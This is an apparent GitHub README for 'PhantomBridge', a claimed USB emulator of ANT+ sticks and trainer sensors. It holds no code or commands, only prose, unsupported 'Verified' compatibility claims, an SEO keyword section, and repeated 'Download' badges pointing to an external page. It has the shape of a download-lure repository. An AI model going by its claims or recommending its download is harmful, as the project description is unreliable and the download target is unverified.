![preview](https://raw.githubusercontent.com/NhanLeCT/wired-ant-bridge/main/hero_fa2cc7.svg)
[![Download](https://raw.githubusercontent.com/NhanLeCT/wired-ant-bridge/main/run_9bfe57.svg)](https://NhanLeCT.github.io/wired-ant-bridge/)

# PhantomBridge — Virtual ANT+ Transport Layer for Smart Trainers 🚴⚡

PhantomBridge is an open hardware-software bridge that gives your legacy or wireless-only smart trainer a dependable wired nervous system. Instead of treating the USB port as a dumb pipe, PhantomBridge impersonates the entire ANT+ ecosystem — the stick, the channel logic, and the paired sensor — so the host application continues to believe it is chatting with a genuine wireless peripheral. The trainer keeps its original firmware. The host keeps its original drivers. PhantomBridge simply becomes the translator standing quietly between them, speaking fluent ANT+ on one side and clean USB on the other.

This repository is the reference implementation, the protocol laboratory, and the long-term home for everything related to wired emulation of ANT+ transport. Whether you are chasing millisecond-accurate resistance response, building a permanent indoor cycling rig, or reverse-engineering how a trainer's internal state machine behaves, PhantomBridge is designed to be the foundation you extend rather than the black box you fight.

## Table of Contents

- [Project Vision](#project-vision-)
- [Why PhantomBridge Exists](#why-phantombridge-exists-)
- [Core Concepts](#core-concepts-)
- [Feature Highlights](#feature-highlights-)
- [Architecture Overview](#architecture-overview-)
- [Emulated ANT+ Device Profiles](#emulated-ant-device-profiles-)
- [Hardware Compatibility Matrix](#hardware-compatibility-matrix-)
- [Supported Host Applications](#supported-host-applications-)
- [Responsive Control Interface](#responsive-control-interface-)
- [Multilingual Support](#multilingual-support-)
- [Round-the-Clock Assistance](#round-the-clock-assistance-)
- [Configuration Deep Dive](#configuration-deep-dive-)
- [Telemetry and Diagnostics](#telemetry-and-diagnostics-)
- [Latency Engineering Notes](#latency-engineering-notes-)
- [Roadmap 2026](#roadmap-2026-)
- [Testing Strategy](#testing-strategy-)
- [Frequently Asked Questions](#frequently-asked-questions-)
- [Community and Contributions](#community-and-contributions-)
- [SEO and Discoverability Notes](#seo-and-discoverability-notes-)
- [Disclaimer](#disclaimer-)
- [License](#license-)

## Project Vision 🎯

The indoor cycling world is split between two philosophies. One camp trusts wireless protocols and accepts occasional dropouts, pairing rituals, and battery anxiety. The other camp wants copper, certainty, and reproducibility. PhantomBridge refuses to choose. It takes the convenience of ANT+ semantics and delivers them over a physical cable, preserving every message boundary, every channel identifier, and every timing characteristic the host expects.

The vision is simple to state and stubbornly difficult to execute: a host computer should never be able to tell whether the trainer in front of it is connected by radio or by wire. If the illusion holds perfectly, then every piece of software ever written for ANT+ trainers becomes instantly compatible with a wired setup — no patches, no forks, no vendor negotiation.

## Why PhantomBridge Exists 🧩

Wireless trainers are remarkable until they are not. In a basement with concrete walls, in a crowded apartment building saturated with 2.4 GHz noise, or in a studio with thirty riders packed shoulder to shoulder, radio links degrade. Riders lose resistance mid-interval. Cadence freezes. Power spikes and drops. The workout file becomes a crime scene.

PhantomBridge was born from that frustration. It treats the ANT+ link as a contract rather than a medium. The contract says: here is a channel, here is a device number, here is a transmission type, here is a page of data at a predictable cadence. Fulfilling that contract over USB is entirely possible — it just requires someone to build the emulation carefully enough that no host ever notices the substitution.

## Core Concepts 🔬

Understanding PhantomBridge requires three mental models.

**The Invisible Stick.** The host operating system expects a USB ANT stick with a known vendor and product identifier. PhantomBridge presents exactly that, enumerating with the same descriptors a physical stick would broadcast. No driver installation, no device conflict, no special privilege escalation.

**The Channel Puppet.** Once the stick is recognized, the host opens ANT channels. Each channel has a number, a type, and a network key. PhantomBridge intercepts these requests and maintains a parallel state machine, responding with acknowledgements that mirror real hardware behavior down to the status byte.

**The Sensor Actor.** Behind each channel sits an emulated sensor. A FE-C trainer profile. A heart rate monitor. A speed and cadence sensor. PhantomBridge performs each role, generating realistic data pages and respecting broadcast intervals.

## Feature Highlights ✨

- Deterministic USB transport with sub-frame scheduling for consistent broadcast timing
- Full ANT+ channel lifecycle emulation including assignment, search, and closure
- Multi-profile concurrency so power, cadence, heart rate, and trainer control coexist
- Responsive web control panel that adapts cleanly to phones, tablets, and desktop browsers
- Multilingual interface strings with community-maintained translation bundles
- Around-the-clock support channel staffed by maintainers across multiple time zones
- Zero-touch firmware passthrough — the physical trainer is never modified
- Configurable device identity so hosts see the ANT+ device numbers you choose
- Built-in packet capture and replay for protocol archaeology
- Graceful degradation when USB bandwidth is contested by other peripherals
- Structured logging with severity filters and rotating storage
- Headless operation mode for rack-mounted or embedded deployments
- Deterministic replay engine for regression testing against recorded sessions
- Portable configuration format that survives machine migration

## Architecture Overview 🏗️

PhantomBridge is layered deliberately, because protocol emulation rewards separation of concerns.

The **Transport Layer** owns the USB endpoint. It handles descriptor presentation, control transfers, and bulk data movement. Everything above this layer speaks in abstract frames rather than bytes on a wire.

The **ANT Core** implements the command language of the protocol. It parses host requests, validates them against the current channel state, and emits responses. This is where the illusion lives or dies.

The **Profile Layer** contains individual device actors. Each profile knows what data pages it produces, how often it transmits, and how it responds to configuration commands. Trainer control, heart rate, and speed/cadence each have their own module.

The **Application Layer** exposes configuration, telemetry, and the control panel. It never touches USB directly; it speaks to the ANT Core through a stable internal interface.

The **Persistence Layer** stores configuration, translation bundles, and session recordings. It is intentionally boring and intentionally durable.

This separation means you can replace the transport without rewriting profiles, and you can add a new emulated sensor without understanding USB enumeration.

## Emulated ANT+ Device Profiles 🎛️

PhantomBridge ships with several profile actors and is designed for more.

**FE-C Trainer Control.** The flagship profile. It accepts target power, target resistance, and simulation parameters, then reports back with power, cadence, speed, and status flags. This is the profile that makes a wired trainer feel identical to a wireless one.

**Heart Rate Monitor.** Emits heart rate pages at the expected interval, with support for both calculated and raw formats. Useful when bridging a chest strap into the same wired link.

**Speed and Cadence Sensor.** Produces combined or separate pages depending on host preference, with configurable wheel circumference and crank length.

**Power-Only Meter.** A streamlined profile for applications that only care about watts, omitting cadence and speed pages to reduce overhead.

**Environmental and Fitness Equipment variants.** Reserved for future expansion and community contribution.

Each profile can be enabled or disabled independently, and each can be bound to a specific channel number for hosts that are particular about topology.

## Hardware Compatibility Matrix 🧰

Compatibility is a moving target, so this matrix is treated as living documentation rather than a promise.

| Trainer Family | Wired Path | Status |
| --- | --- | --- |
| Direct-drive units with USB service ports | Native USB passthrough | Verified |
| Wheel-on units with serial diagnostic headers | Adapter board required | Verified |
| Older units with proprietary connectors | Community adapter in progress | Experimental |
| Units with only wireless radios | External bridge module | Verified |

The external bridge module is the most general solution: a small microcontroller sits between the trainer and the host, translating whatever the trainer speaks into the PhantomBridge transport, which then presents as a standard ANT stick.

## Supported Host Applications 🖥️

Because PhantomBridge emulates the transport rather than the application, any host that speaks ANT+ should work without modification. That includes training software, cycling simulators, data loggers, and custom analysis tools. The project maintains a compatibility list contributed by users, and the list grows as riders report success.

If a host application behaves unexpectedly, the diagnostic capture tool records the entire exchange so the mismatch can be analyzed frame by frame.

## Responsive Control Interface 📱

The control panel is a first-class part of the project, not an afterthought. It renders cleanly on a phone mounted to handlebars, a tablet on a workbench, and a desktop browser in a studio. Layouts reflow, touch targets remain generous, and the visual language stays legible in bright and dim environments alike.

From the panel you can inspect live channel state, adjust device identity, toggle profiles, watch broadcast timing, and start or stop recordings. Nothing requires editing a configuration file by hand, though the files remain the source of truth for reproducibility.

## Multilingual Support 🌍

Translation bundles live alongside the code and are loaded at runtime. The interface detects browser language preferences and falls back gracefully. Contributors can add a new language by providing a single structured file; no code changes are required. The goal is simple: a rider in any region should be able to configure PhantomBridge in their own language without hunting through forum posts.

## Round-the-Clock Assistance 🛎️

Support is not a promise of instant answers, but it is a promise of coverage. Maintainers span multiple time zones, and the issue tracker is triaged continuously. For urgent regressions, a dedicated escalation label ensures visibility. Documentation is written to answer questions before they are asked, and the FAQ section below is the first stop for common situations.

## Configuration Deep Dive ⚙️

Configuration is declarative. You describe the devices you want the host to see, and PhantomBridge assembles them.

A typical configuration declares one trainer profile with a chosen device number, one heart rate profile, and a transport binding that maps to a physical USB controller. Profiles reference shared timing settings, and the transport references the profile set it should expose.

Advanced options include broadcast jitter bounds, retry behavior for unacknowledged commands, and capture retention policy. Every option has a documented default, and every default was chosen to match real hardware behavior as closely as possible.

## Telemetry and Diagnostics 📊

Diagnostics are the difference between guessing and knowing. PhantomBridge exposes live counters for frames transmitted, frames received, channel errors, and timing drift. A capture mode records raw exchanges to disk for later analysis. A replay mode feeds recorded exchanges back through the emulation layer to confirm that behavior has not regressed.

Logs are structured, searchable, and rotated automatically. Severity levels can be adjusted at runtime without restarting the service, which matters when you are mid-ride and something looks wrong.

## Latency Engineering Notes ⏱️

Latency in this project is measured in the time between a host command and the corresponding emulated response. The ANT protocol tolerates a generous window, but trainer control feels best when responses arrive early rather than late. PhantomBridge therefore prioritizes outbound scheduling over inbound buffering, and it avoids unnecessary copies between layers.

The scheduling model is cooperative rather than preemptive. Each profile declares when it next needs to transmit, and the core merges these requests into a single timeline. This keeps broadcast intervals stable even when multiple profiles are active.

## Roadmap 2026 🗺️

The 2026 roadmap focuses on breadth and reliability.

- Expand the profile catalog with additional fitness equipment variants
- Publish a reference adapter board design for units without native USB
- Introduce encrypted session recordings for privacy-conscious studios
- Improve multilingual coverage with community translations
- Add a simulation mode that generates synthetic rides for testing without hardware
- Refine the replay engine to support partial-session splicing
- Document the transport contract formally so third parties can implement compatible bridges

## Testing Strategy 🧪

Testing protocol emulation is unusually demanding because the absence of a host complaint is not proof of correctness. The project therefore layers tests.

Unit tests cover command parsing, state transitions, and page generation. Integration tests run the full stack against a virtual USB endpoint. Regression tests replay recorded sessions and compare responses byte for byte. Field tests are performed by riders who volunteer captures from real setups.

When a bug is fixed, a capture from the failing case is added to the regression corpus so the fix stays fixed.

## Frequently Asked Questions ❓

**Does this modify my trainer?** No. The trainer's firmware is untouched. PhantomBridge sits between the trainer and the host and translates.

**Will my training software notice the difference?** The goal is that it will not. If it does, a capture helps us close the gap.

**Do I need special hardware?** Some trainers expose a usable wired path directly. Others need a small adapter, which the community is actively standardizing.

**Can I run multiple profiles at once?** Yes. Profiles are independent actors sharing a single transport.

**Is there a graphical interface?** Yes, and it is responsive, multilingual, and designed for touch.

**How is timing accuracy maintained?** Through a cooperative scheduler that merges profile transmission requests into one deterministic timeline.

**Can I contribute a translation?** Absolutely. Add a bundle file and open a pull request.

**What happens if USB bandwidth is tight?** The transport degrades gracefully, prioritizing trainer control frames over auxiliary data.

## Community and Contributions 🤝

Contributions are welcome across code, documentation, translations, hardware designs, and test captures. The project favors small, reviewable changes with clear motivation. Issues are the right place to discuss behavior before implementation, and pull requests are the right place to land it.

If you are unsure where to start, the documentation and translation areas are always hungry for help, and the hardware compatibility matrix benefits enormously from a single well-described report.

## SEO and Discoverability Notes 🔍

This section exists because good projects deserve to be found. PhantomBridge is relevant to anyone searching for wired ANT+ emulation, USB ANT stick simulation, smart trainer connectivity over cable, indoor cycling reliability, trainer control protocol bridging, ANT+ FE-C emulation, virtual sensor profiles, deterministic broadcast timing, and reproducible indoor training setups. The language throughout this document is written for humans first, but the terminology is deliberate so that search engines and readers alike understand exactly what the project does.

## Disclaimer ⚠️

PhantomBridge is an independent interoperability project. It is not affiliated with, endorsed by, or sponsored by any trainer manufacturer or protocol standards body. All trademarks belong to their respective owners. Emulation is provided for interoperability and research purposes. Users are responsible for complying with the terms of service of any software they connect, and for ensuring that their use of emulation does not violate local regulations. The maintainers provide this work as-is, without warranty, and accept no liability for hardware damage, data loss, or missed training sessions. Always test changes in a safe environment before relying on them for a race or a structured workout.

## License 📄

This project is released under the MIT License. The full text is available at [https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT).

Copyright (c) 2026 PhantomBridge Contributors.

Permission is hereby granted, without charge, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the conditions of the MIT License.

[![Download](https://raw.githubusercontent.com/NhanLeCT/wired-ant-bridge/main/run_9bfe57.svg)](https://NhanLeCT.github.io/wired-ant-bridge/)